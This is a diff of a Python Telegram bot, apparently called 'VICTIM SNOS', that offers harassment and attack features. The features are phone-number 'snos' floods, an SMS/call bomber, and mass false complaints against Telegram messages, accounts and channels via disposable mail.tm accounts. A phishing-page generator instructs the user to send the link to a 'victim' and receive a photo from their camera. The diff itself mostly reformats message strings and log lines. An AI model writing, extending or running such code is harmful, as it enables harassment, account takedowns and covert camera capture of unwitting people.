     await edit_message_with_banner(
         cb,
-        f"<b>СНОС ПОЧТА</b>\n\n"
-        f"Аккаунтов: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
+        f"<b>СНОС ПОЧТА</b>\n\nАккаунтов: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
         get_mail_menu()
     )
     await cb.answer()
@@ -1137,13 +1252,10 @@ async def status(cb: types.CallbackQuery):
         f"<b>СТАТУС</b>\n\n"
         f"ID: <code>{user_id}</code>\n"
         f"Сессии: {get_user_sessions_count(user_id)}/{SESSIONS_PER_USER}\n"
-        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
-        f"OAuth: {len(TELEGRAM_OAUTH_SITES)}\n"
-        f"Бомбер: {len(BOMBER_WEBSITES)}",
+        f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}",
         InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]])
     )
 
-# Снос номера
 @dp.callback_query(F.data == "snos")
 async def snos_start(cb: types.CallbackQuery, state: FSMContext):
     if not await check_channel_subscription(cb.from_user.id):
@@ -1207,10 +1319,7 @@ async def snos_count(msg: types.Message, state: FSMContext):
     async def progress_callback(cur, tot, ok_count):
         try:
             await st.edit_caption(
-                caption=f"<b>СНОС НОМЕРА</b>\n\n"
-                        f"{phone}\n"
-                        f"Раунд: {cur}/{tot}\n"
-                        f"Запросов: {ok_count}"
+                caption=f"<b>СНОС НОМЕРА</b>\n\n{phone}\nРаунд: {cur}/{tot}\nЗапросов: {ok_count}"
             )
         except:
             pass
@@ -1225,13 +1334,10 @@ async def snos_count(msg: types.Message, state: FSMContext):
     
     await send_message_with_banner(
         msg,
-        f"<b>СНОС ЗАВЕРШЕН</b>\n\n"
-        f"Номер: <code>{phone}</code>\n"
-        f"Запросов: <b>{ok}</b>",
+        f"<b>СНОС ЗАВЕРШЕН</b>\n\nНомер: <code>{phone}</code>\nЗапросов: <b>{ok}</b>",
         get_main_menu()
     )
 
-# Бомбер
 @dp.callback_query(F.data == "bomber")
 async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
     if not await check_channel_subscription(cb.from_user.id):
@@ -1303,7 +1409,6 @@ async def bomber_count(msg: types.Message, state: FSMContext):
         get_main_menu()
     )
 
-# Жалобы на сообщения
 @dp.callback_query(F.data == "report_msg")
 async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
     if not await check_channel_subscription(cb.from_user.id):
@@ -1379,7 +1484,6 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
         reply_markup=get_main_menu()
     )
 
-# Снос Почта - Аккаунт
 @dp.callback_query(F.data == "mail_acc")
 async def mail_acc_menu(cb: types.CallbackQuery):
     if not mail_tm.ready:
@@ -1465,7 +1569,6 @@ async def mail_acc_id(msg: types.Message, state: FSMContext):
         get_main_menu()
     )
 
-# Снос Почта - Канал
 @dp.callback_query(F.data == "mail_chan")
 async def mail_chan_menu(cb: types.CallbackQuery):
     if not mail_tm.ready:
@@ -1531,7 +1634,6 @@ async def mail_chan_violation(msg: types.Message, state: FSMContext):
         get_main_menu()
     )
 
-# Фишинг (быстрое создание)
 @dp.callback_query(F.data == "phish_create")
 async def phish_create_start(cb: types.CallbackQuery, state: FSMContext):
     await state.set_state(PhishState.waiting_title)
@@ -1580,9 +1682,7 @@ async def phish_button(msg: types.Message, state: FSMContext):
         add_log(user_id, "Фишинг", url)
         await send_message_with_banner(
             msg,
-            f"<b>ФИШ-СТРАНИЦА СОЗДАНА!</b>\n\n"
-            f"<code>{url}</code>\n\n"
-            f"<i>Отправьте ссылку жертве. При нажатии кнопки вы получите фото с камеры!</i>",
+            f"<b>ФИШ-СТРАНИЦА СОЗДАНА!</b>\n\n<code>{url}</code>\n\n<i>Отправьте ссылку жертве. При нажатии кнопки вы получите фото с камеры!</i>",
             get_main_menu()
         )
     else:
@@ -1679,8 +1779,8 @@ async def main():
     load_allowed_users()
     logger.info(f"VICTIM SNOS запуск...")
     logger.info(f"Сессий: {SESSIONS_PER_USER}")
-    logger.info(f"OAuth сайтов: {len(TELEGRAM_OAUTH_SITES)}")
-    logger.info(f"Сайтов бомбера: {len(BOMBER_WEBSITES)}")
+    logger.info(f"Устройств: {len(DEVICES)}")
+    logger.info(f"User-Agent: {len(USER_AGENTS)}")
     
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
